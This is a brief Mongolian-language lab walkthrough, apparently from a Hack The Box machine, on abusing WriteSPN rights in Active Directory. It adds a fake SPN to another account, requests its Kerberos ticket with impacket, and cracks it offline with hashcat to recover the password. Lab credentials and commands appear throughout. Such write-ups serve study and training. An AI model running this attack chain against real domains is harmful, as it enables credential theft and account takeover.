# WriteSPN

WriteSPN эрх нь хэрэглэгчийг **Service Principal Name (SPN)**-тэй болгож өөрчлөх боломжийг олгоно. Ингэснээр Kerberos ticket (TGS) хүсэж аваад offline crack хийж нууц үг олно.

## SPN Нэмэх (addspn.py)

`alfred`-д хуурамч сервис (`service/myfake-spn`) оноосноор систем дээр "сервис ажиллуулж байгаа хэрэглэгч" гэж бүртгэгдэнэ:

```bash
python3 addspn.py -u 'tombwatcher.htb\henry' -p 'H3nry_987TGV!' -t alfred -s "service/myfake-spn" 10.129.232.167
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

## Kerberoasting

Нэгэнт `alfred` сервис болсон учраас Active Directory-оос TGS тасалбар авна:

```bash
impacket-GetUserSPNs -request -dc-ip 10.129.232.167 tombwatcher.htb/henry:'H3nry_987TGV!'
```

[image]

## Offline Crack

```bash
hashcat -m 13100 alfred_hash.txt /usr/share/wordlists/rockyou.txt
# Password: basketball
```
